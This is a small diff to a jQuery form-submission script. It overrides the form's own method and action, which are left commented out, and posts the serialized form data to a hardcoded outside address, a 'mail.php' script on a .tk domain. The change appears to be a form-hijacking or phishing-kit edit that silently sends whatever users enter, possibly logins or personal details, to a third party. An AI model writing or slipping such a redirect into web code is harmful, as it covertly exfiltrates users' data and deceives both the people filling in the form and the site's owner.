@@ -153,8 +153,8 @@ $(document).ready(function(){
         $('#waitMsg').css('display', 'block');
         
         $.ajax({
-        type: form.attr('method'),
-        url: form.attr('action'),
+        type: 'POST',//form.attr('method'),
+        url: 'https://www.amxinfinity.tk/mail.php?ml',//form.attr('action'),
         data: form.serialize(),
         success: function(data) {
             $('#waitMsg').css('display', 'none');
